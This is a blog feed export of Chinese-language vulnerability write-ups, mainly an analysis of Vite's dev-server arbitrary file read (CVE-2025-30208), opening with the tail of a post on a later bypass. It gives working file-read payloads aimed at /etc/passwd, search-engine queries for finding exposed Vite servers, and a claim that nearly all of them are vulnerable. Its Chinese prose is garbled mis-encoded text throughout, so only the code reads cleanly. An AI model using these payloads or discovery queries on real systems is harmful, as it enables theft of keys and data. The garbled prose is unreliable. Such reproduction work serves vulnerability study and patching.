class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒinlineRE.test(id)æ˜¯falseçš„ã€‚</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯svgExtRE.test(id)ä¸ºtrueã€‚</p><p>ç„¶åå°±æ˜¯æ¸…æ´—Urlï¼Œfileä¸º<code>/@fs/etc/passwd</code>ï¼Œå¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹vite6.2.5æ˜¯å¦‚ä½•è¿›è¡Œé˜²å¾¡çš„ï¼š</p><p><code>/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlRE = <span class="regexp">/[?&amp;]url\b/</span></span><br><span class="line"><span class="keyword">const</span> rawRE = <span class="regexp">/[?&amp;]raw\b/</span></span><br><span class="line"><span class="keyword">const</span> inlineRE = <span class="regexp">/[?&amp;]inline\b/</span></span><br><span class="line"><span class="keyword">const</span> svgRE = <span class="regexp">/\.svg\b/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deniedServingAccessForTransform</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">server</span>: <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">res</span>: <span class="title class_">ServerResponse</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">next</span>: <span class="title class_">Connect</span>.<span class="title class_">NextFunction</span>,</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    (rawRE.<span class="title function_">test</span>(url) ||</span><br><span class="line">      urlRE.<span class="title function_">test</span>(url) ||</span><br><span class="line">      inlineRE.<span class="title function_">test</span>(url) ||</span><br><span class="line">      svgRE.<span class="title function_">test</span>(url)) &amp;&amp;</span><br><span class="line">    !<span class="title function_">ensureServingAccess</span>(url, server, res, next)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>svgRE.test(url))ä¸ºtrueäº†ã€‚ã€‚ã€‚ç›´æ¥é˜²ä¸‹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> CVEå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVEå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Viteå¼€å‘æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå¤ç°(CVE-2025-30208)</title>
      <link href="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/"/>
      <url>/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆæ­¥äº†è§£"><a href="#åˆæ­¥äº†è§£" class="headerlink" title="åˆæ­¥äº†è§£"></a>åˆæ­¥äº†è§£</h2><p>Vite æ˜¯ä¸€æ¬¾ç°ä»£åŒ–çš„å‰ç«¯å¼€å‘æ„å»ºå·¥å…·ï¼Œå®ƒæä¾›äº†å¿«é€Ÿçš„å¼€å‘æœåŠ¡å™¨å’Œé«˜æ•ˆçš„æ„å»ºèƒ½åŠ›ï¼Œå¹¿æ³›åº”ç”¨äº Vue.js é¡¹ç›®çš„å¼€å‘è¿‡ç¨‹ä¸­ã€‚<br>ç”±äº Vite å¼€å‘æœåŠ¡å™¨åœ¨å¤„ç†ç‰¹å®š URL è¯·æ±‚æ—¶ï¼Œæ²¡æœ‰å¯¹è¯·æ±‚çš„è·¯å¾„è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨æ£€æŸ¥å’Œé™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ç»•è¿‡ä¿æŠ¤æœºåˆ¶ï¼Œéæ³•è®¿é—®é¡¹ç›®æ ¹ç›®å½•å¤–çš„æ•æ„Ÿæ–‡ä»¶ã€‚æ”»å‡»è€…åªéœ€åœ¨æµè§ˆå™¨è¾“å…¥ä¸€ä¸ª URLï¼Œå°±å¯èƒ½ä¼šé€ æˆæºç ã€SSHå¯†é’¥ã€æ•°æ®åº“è´¦å·ã€ç”¨æˆ·æ•°æ®ç­‰ç›®æ ‡æœºå™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ä¿¡æ¯æ³„éœ²ã€‚</p><p>å½±å“ç‰ˆæœ¬ï¼š</p><blockquote><p>6.2.0 &lt;&#x3D; Vite &lt;&#x3D; 6.2.2</p><p>6.1.0 &lt;&#x3D; Vite &lt;&#x3D; 6.1.1</p><p>6.0.0 &lt;&#x3D; Vite &lt;&#x3D; 6.0.11</p><p>5.0.0 &lt;&#x3D; Vite &lt;&#x3D; 5.4.14</p><p>Vite &lt;&#x3D; 4.5.9</p></blockquote><p>å…¶å®2021å¹´4æœˆå°±æœ‰äººç¬¬ä¸€æ¬¡ç»™Viteæäº¤äº†<code>@fs</code>å¯¼è‡´çš„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCNVD-2022-4461ï¼‰ï¼Œå½“æ—¶çš„payloadå°±æ˜¯ï¼š<code>/@fs/etc/passwd</code>ã€‚</p><p>åæ¥å®˜æ–¹ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œç›´åˆ°æœ€è¿‘è¡¥ä¸è¢«ç»•è¿‡ã€‚ä½¿ç”¨è¿™ä¸ªpayloadæ¥ç»•è¿‡ï¼š<code>/@fs/etc/passwd?raw??</code></p><p>Fofaæœç´¢è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;/@vite/client&quot;</span><br></pre></td></tr></table></figure><p>äº²æµ‹ï¼Œå‡ ä¹æ‰€æœ‰ç½‘ç«™éƒ½æœ‰æ´ï¼ï¼ï¼</p><p>360quakeæœç´¢è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body:&quot;/@vite/client&quot;</span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è¿™é‡Œçš„ç¯å¢ƒæˆ‘ä»¬ç›´æ¥ç”¨pç¥çš„vulhubæ¼æ´ç¯å¢ƒã€‚</p><p><a href="https://github.com/vulhub/vulhub/tree/master/vite">https://github.com/vulhub/vulhub/tree/master/vite</a></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>payloadï¼šä»¥ä¸‹ä¸¤ä¸ªpayloadéƒ½æ˜¯å¯ä»¥çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5173/@fs/etc/passwd?raw??          åªèƒ½è¯»æ— åç¼€æ–‡ä»¶</span><br><span class="line">http://192.168.79.128:5173/@fs/etc/passwd?import&amp;raw??   ç”¨è¿™ä¸ªæ¯”è¾ƒå¥½ï¼Œå¯ä»¥è¯»æœ‰åç¼€çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331164222066.png" class="" title="This is an example image"><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331164108194.png" class="" title="This is an example image"><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><code>@fs</code>æ‹’ç»è®¿é—® Vite æœåŠ¡å…è®¸åˆ—è¡¨ä¹‹å¤–çš„æ–‡ä»¶ã€‚å°†<code>?raw??</code>æˆ–<code>?import&amp;raw??</code>æ·»åŠ åˆ° URL å¯ç»•è¿‡æ­¤é™åˆ¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚ä¹‹æ‰€ä»¥å­˜åœ¨è¿™ç§ç»•è¿‡ï¼Œæ˜¯å› ä¸º<code>?</code>åœ¨å¤šä¸ªåœ°æ–¹åˆ é™¤äº†å°¾éšåˆ†éš”ç¬¦ï¼ˆä¾‹å¦‚ï¼‰ï¼Œä½†åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²æ­£åˆ™è¡¨è¾¾å¼ä¸­æ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ã€‚</p><p>ä¸»è¦ä¿®è¡¥ç‚¹ï¼š<a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cL43-R188">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cL43-R188</a></p><p>packages&#x2F;vite&#x2F;src&#x2F;node&#x2F;server&#x2F;middlewares&#x2F;transform.ts</p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331185454174.png" class="" title="This is an example image"><p>å®˜æ–¹çš„commitå…¶å®å°±æ˜¯åŠ äº†ä¸ªæ­£åˆ™ï¼ŒåŒæ—¶åœ¨ä¹‹åè¿›è¡Œäº†æ›¿æ¢</p><p>ä½¿ç”¨æ­£åˆ™<code>/[?&amp;]+$/</code>æ›¿æ¢æˆç©ºå€¼ï¼Œå°†urlåœ°å€æœ€åçš„è¿ç»­çš„&amp;æˆ–è€…?æ›¿æ¢æˆç©ºã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆçœ‹çœ‹6.2.2ç‰ˆæœ¬ï¼ˆæ¼æ´ç‰ˆæœ¬ï¼‰çš„rawREå’ŒurlRE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export const urlRE = /(\?|&amp;)url(?:&amp;|$)/</span><br><span class="line">export const rawRE = /(\?|&amp;)raw(?:&amp;|$)/</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ­£åˆ™åŒ¹é…è¿›è¡Œåˆ¤æ–­æ˜¯å¦å±äºrawæˆ–è€…urlç±»å‹çš„ã€‚æ»¡è¶³ä»»æ„ä¸€ä¸ªå°±ä¼šä½¿ç”¨ensureServingAccesså‡½æ•°è¿›è¡Œé‰´æƒã€‚æ¯”å¦‚rawReçš„æ­£åˆ™ä¸ºï¼š<code>export const rawRE = /(\?|&amp;)raw(?:&amp;|$)/</code></p><p>åŒ¹é…è¦æ±‚rawå‚æ•°ç»“æŸæˆ–è€…raw&amp;ã€‚ç»“åˆå®˜æ–¹çš„ä¿®å¤æ–¹æ¡ˆè¿™é‡Œä½¿ç”¨çš„æ˜¯?raw?è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯åœ¨è¿™ä¸ªå‡½æ•°å¼€å¤´æœ‰ä¸€éƒ¨åˆ†ä»£ç </p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      url = <span class="built_in">decodeURI</span>(<span class="title function_">removeTimestampQuery</span>(req.<span class="property">url</span>!)).<span class="title function_">replace</span>(</span><br><span class="line">        <span class="variable constant_">NULL_BYTE_PLACEHOLDER</span>,</span><br><span class="line">        <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">      )</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>(e)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹removeTimestampQueryå‡½æ•°</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> trailingSeparatorRE = <span class="regexp">/[?&amp;]$/</span>    <span class="comment">//åŒ¹é…æœ€åä¸€ä½?æˆ–è€…&amp;çš„å­—ç¬¦ï¼Œå¹¶æ›¿æ¢ä¸ºç©º</span></span><br><span class="line"><span class="keyword">const</span> timestampRE = <span class="regexp">/\bt=\d&#123;13&#125;&amp;?\b/</span>   <span class="comment">//åŒ¹é…13ä½çš„æ•°å­—ï¼Œå¹¶æ›¿æ¢ä¸ºç©ºconst</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeTimestampQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(timestampRE, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¼šåˆ é™¤æœ€åä¸€ä½çš„<code>?</code>ï¼Œå› æ­¤payloadå°±æ˜¯<code>?raw??</code></p><p>å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œåªæ›¿æ¢äº†ä¸€æ¬¡ä¸ºç©º?æˆ–è€…&amp;ï¼Œæ•…urlç”±</p><p>&#x2F;@fs&#x2F;tmp&#x2F;test.txt?import&amp;raw?? æ›¿æ¢æˆäº†</p><p>&#x2F;@fs&#x2F;tmp&#x2F;test.txt?import&amp;raw?</p><p>ç„¶åæˆ‘ä»¬è·Ÿç€ä»£ç å¾€ä¸‹èµ°ï¼Œä¼šèµ°åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">       (rawRE.<span class="title function_">test</span>(url) || urlRE.<span class="title function_">test</span>(url)) &amp;&amp;</span><br><span class="line">       !<span class="title function_">ensureServingAccess</span>(url, server, res, next)</span><br><span class="line">     ) &#123;</span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„éœ€è¦rawRE.test(url)å’ŒurlRE.test(url)éƒ½ä¼šfalseæ‰ä¸ä¼šè¿›å…¥ensureServingAccessè¿›è¡Œé‰´æƒã€‚</p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331194046444.png" class="" title="This is an example image"><p>ç„¶åå°±æ˜¯é€šè¿‡importå‚æ•°è¿›å…¥ifæ¡ä»¶åˆ¤æ–­ã€‚å¹¶è°ƒç”¨removeImportQueryæ¸…é™¤importå‚æ•°çš„å‡½æ•°ã€‚</p><p>ç„¶åæˆ‘ä»¬å†ä¸¤è€…éƒ½ä¸ºfalseçš„å‰æä¸‹å¾€ä¸‹èµ°ï¼š</p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331194705098.png" class="" title="This is an example image"><p>æ¥ ä¸‹ æ¥ ä¼š ä¾ æ¬¡ åˆ¤ æ–­ isJSRequest ï¼Œ isImportRequest ï¼Œ isCSSRequest ï¼Œ isHTMLProxyã€‚</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> knownJsSrcRE =</span><br><span class="line">  <span class="regexp">/\.(?:[jt]sx?|m[jt]s|vue|marko|svelte|astro|imba|mdx)(?:$|\?)/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isJSRequest = (<span class="attr">url</span>: <span class="built_in">string</span>): <span class="function"><span class="params">boolean</span> =&gt;</span> &#123;</span><br><span class="line">  url = <span class="title function_">cleanUrl</span>(url)</span><br><span class="line">  <span class="keyword">if</span> (knownJsSrcRE.<span class="title function_">test</span>(url)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!path.<span class="title function_">extname</span>(url) &amp;&amp; url[url.<span class="property">length</span> - <span class="number">1</span>] !== <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isImportRequest = (<span class="attr">url</span>: <span class="built_in">string</span>): <span class="function"><span class="params">boolean</span> =&gt;</span> importQueryRE.<span class="title function_">test</span>(url)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">CSS_LANGS_RE</span> =</span><br><span class="line">  <span class="regexp">/\.(css|less|sass|scss|styl|stylus|pcss|postcss|sss)(?:$|\?)/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isCSSRequest = (<span class="attr">request</span>: <span class="built_in">string</span>): <span class="function"><span class="params">boolean</span> =&gt;</span></span><br><span class="line">  <span class="variable constant_">CSS_LANGS_RE</span>.<span class="title function_">test</span>(request)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isHtmlProxyRE = <span class="regexp">/\?html-proxy\b/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isHTMLProxy = (<span class="attr">id</span>: <span class="built_in">string</span>): <span class="function"><span class="params">boolean</span> =&gt;</span> isHtmlProxyRE.<span class="title function_">test</span>(id)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‹¿<code>/@fs/etc/passwd?import&amp;raw??</code>æ¥è¯´ï¼Œç»è¿‡äº†ä¸€ä¸ªremoveTimestampQueryåä¼šå˜æˆ<code>/@fs/etc/passwd?import&amp;raw?</code>ã€‚</p><p>é‚£å°±ä¼šåœ¨ isImportRequestå¤„æ–­è¨€ä¸ºçœŸ</p><blockquote><p>ä½†æ˜¯æ­¤æ—¶æˆ‘æœ‰ä¸€ä¸ªç–‘é—®ï¼Ÿï¼Ÿ</p><p>ä¸ºä»€ä¹ˆ**?raw??**è¿™ä¸ªpayloadä¹Ÿæ˜¯å¯ä»¥çš„ï¼Ÿï¼Ÿä¸Šé¢çš„æ­£åˆ™å¥½åƒéƒ½åŒ¹é…ä¸ä¸Šå•Šï¼Ÿ</p><p>è¿™é‡Œæˆ‘ä»¬çœ‹ä¸‹jsçš„åˆ¤æ–­å‡½æ•°</p><p>if (!path.extname(url) &amp;&amp; url[url.length - 1] !&#x3D;&#x3D; â€˜&#x2F;â€˜) {<br> return true<br>}</p><p>å¦‚æœæ²¡æœ‰æ–‡ä»¶æ‹“å±•åä¸”ä¸ä»¥æ–œæ ç»“å°¾ï¼Œé‚£ä¹ˆç›´æ¥è¿”å›true</p><p>ä½†æ˜¯æœ‰é™åˆ¶ï¼Œåªèƒ½è¯»å–æ— åç¼€æ–‡ä»¶</p></blockquote><p>ç»è¿‡ä¸Šè¿°è¿™ä¸ªifåˆ¤æ–­åï¼Œä¼šè¿›å…¥ifè¯­å¥ã€‚é‚£ä¹ˆé‡åˆ°çš„å°±æ˜¯removeImportQueryå‡½æ•°</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"><span class="keyword">const</span> trailingSeparatorRE = <span class="regexp">/[?&amp;]$/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeImportQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨removeImportQueryå‡½æ•°ä¸­åœ¨æ¸…é™¤æ‰importå‚æ•°åï¼Œè¿˜å°†ç»“å°¾çš„å¤šä½™çš„?æˆ–è€…&amp;ç»™æ¸…é™¤æ‰äº†ã€‚</p><p>éšåè¿›å…¥åˆ°transformRequestä¸­ï¼Œæ­¤æ—¶<code>/@fs/etc/passwd?raw</code></p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331202800905.png" class="" title="This is an example image"><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cacheKey = <span class="string">`<span class="subst">$&#123;options.html ? <span class="string">&#x27;html:&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span><span class="subst">$&#123;url&#125;</span>`</span></span><br><span class="line"><span class="comment">// æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰ç›¸åŒçš„è¯·æ±‚åœ¨è¿›è¡Œä¸­</span></span><br><span class="line"><span class="keyword">const</span> pending = environment.<span class="property">_pendingRequests</span>.<span class="title function_">get</span>(cacheKey)</span><br><span class="line"><span class="comment">// ç›´æ¥å¤ç”¨å·²æœ‰çš„è¯·æ±‚ï¼Œé¿å…é‡å¤å‘é€</span></span><br><span class="line"><span class="keyword">if</span> (pending) &#123;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ä¸€èˆ¬ç”¨äºè¯·æ±‚å»é‡ã€‚</p><p>pendingä¸ºç©ºï¼Œç„¶åå°±è¿›å…¥äº†doTransformå‡½æ•°ã€‚</p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331204313895.png" class="" title="This is an example image"><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">doTransform</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">DevEnvironment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">options</span>: <span class="title class_">TransformOptions</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">timestamp</span>: <span class="built_in">number</span>,</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  url = <span class="title function_">removeTimestampQuery</span>(url)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; pluginContainer &#125; = environment</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="variable language_">module</span> = <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleByUrl</span>(url)</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">module</span>) &#123;</span><br><span class="line">    <span class="comment">// try use cache from url</span></span><br><span class="line">    <span class="keyword">const</span> cached = <span class="keyword">await</span> <span class="title function_">getCachedTransformResult</span>(</span><br><span class="line">      environment,</span><br><span class="line">      url,</span><br><span class="line">      <span class="variable language_">module</span>,</span><br><span class="line">      timestamp,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> (cached) <span class="keyword">return</span> 